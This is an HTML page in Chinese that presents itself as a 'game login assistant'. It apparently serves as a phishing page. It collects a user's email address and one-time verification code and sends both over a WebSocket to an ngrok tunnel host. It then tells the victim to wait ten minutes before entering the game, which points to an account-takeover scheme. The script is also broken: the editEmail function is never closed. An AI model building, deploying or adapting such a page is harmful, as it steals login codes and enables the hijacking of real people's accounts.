<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>游戏登录助手</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 450px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        h1 {
            color: #fff;
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            letter-spacing: 1px;
        }
        .status {
            text-align: center;
            padding: 12px;
            border-radius: 10px;
            margin-bottom: 15px;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        .connected {
            background: rgba(16, 185, 129, 0.2);
            color: #10b981;
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
        .disconnected {
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .hint {
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
            margin-bottom: 15px;
            text-align: center;
        }
        .input-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .input-wrapper {
            display: flex;
            gap: 10px;
        }
        input {
            flex: 1;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        input:focus {
            outline: none;
            border-color: #3b82f6;
            background: rgba(255, 255, 255, 0.15);
        }
        button {
            padding: 15px;
            background: linear-gradient(90deg, #3b82f6 0%, #8b5cf6 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        button:disabled {
            background: rgba(255, 255, 255, 0.2);
            color: rgba(255, 255, 255, 0.5);
            cursor: not-allowed;
        }
        button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
        }
        .btn-modify {
            width: auto;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
        }
        .log {
            margin-top: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            color: rgba(255, 255, 255, 0.8);
            font-size: 14px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>游戏登录助手</h1>
        
        <div class="status disconnected" id="status">正在连接服务器...</div>
        <div class="hint">💡 温馨提示：请输入正确邮箱并确认后再发送</div>

        <div class="input-group">
            <div class="input-wrapper">
                <input type="email" id="emailInput" placeholder="请输入邮箱地址">
                <button class="btn-modify" onclick="editEmail()">修改</button>
            </div>
            <button onclick="sendEmail()" id="emailBtn" disabled>提交邮箱</button>
        </div>

        <div class="input-group">
            <div class="input-wrapper">
                <input type="text" id="codeInput" placeholder="请输入验证码">
                <button class="btn-modify" onclick="editCode()">修改</button>
            </div>
            <button onclick="sendCode()" id="codeBtn" disabled>提交验证码</button>
        </div>

        <div class="log" id="log"></div>
    </div>

    <script>
        const WS_URL = "wss://draw-residence-scrutiny.ngrok-free.dev";
        let ws;
        let emailSubmitted = false;
        let codeSubmitted = false;
        const logEl = document.getElementById("log");

        function updateStatus(text, className, isConnected) {
            const statusEl = document.getElementById("status");
            statusEl.textContent = text;
            statusEl.className = `status ${className}`;
            document.getElementById("emailBtn").disabled = !isConnected || emailSubmitted;
            document.getElementById("codeBtn").disabled = !isConnected || codeSubmitted;
            document.getElementById("emailInput").disabled = emailSubmitted;
            document.getElementById("codeInput").disabled = codeSubmitted;
        }

        function updateLog(text) {
            logEl.textContent = text;
        }

        function connect() {
            updateStatus("正在连接服务器...", "disconnected", false);
            ws = new WebSocket(WS_URL);

            ws.onopen = () => {
                updateStatus("✅ 已连接到服务器", "connected", true);
            };

            ws.onmessage = (event) => {
                const res = JSON.parse(event.data);
            };

            ws.onclose = () => {
                updateStatus("连接断开，正在重连...", "disconnected", false);
                setTimeout(connect, 3000);
            };

            ws.onerror = () => {
                updateStatus("连接错误，请检查 ngrok 地址", "disconnected", false);
            };
        }

        // 提交邮箱
        function sendEmail() {
            const email = document.getElementById("emailInput").value.trim();
            if (!email) return;
            if (ws && ws.readyState === WebSocket.OPEN) {
                const message = JSON.stringify({ type: "email", content: email });
                ws.send(message);
                emailSubmitted = true;
                document.getElementById("emailBtn").textContent = "已提交";
                updateLog("✅ 邮箱已发送，注意查收验证码");
                updateStatus("✅ 已连接到服务器", "connected", true);
            }
        }

        // 修改邮箱 → 修复完成
        function editEmail() {
            emailSubmitted = false;
            document.getElementById("emailInput").disabled = false;
            document.getElementById("emailBtn").textContent = "提交邮箱";
            updateStatus("✅ 已连接到服务器", "connected", true);
            // 提交验证码
        function sendCode() {
            const code = document.getElementById("codeInput").value.trim();
            if (!code) return;
            if (ws && ws.readyState === WebSocket.OPEN) {
                const message = JSON.stringify({ type: "code", content: code });
                ws.send(message);
                codeSubmitted = true;
                document.getElementById("codeBtn").textContent = "已提交";
                updateLog("✅ 验证码已接收，请十分钟后上游戏");
                updateStatus("✅ 已连接到服务器", "connected", true);
            }
        }

        // 修改验证码 → 修复完成
        function editCode() {
            codeSubmitted = false;
            document.getElementById("codeInput").disabled = false;
            document.getElementById("codeBtn").textContent = "提交验证码";
            updateStatus("✅ 已连接到服务器", "connected", true);
        }

        window.onload = connect;
    </script>
</body>
</html>
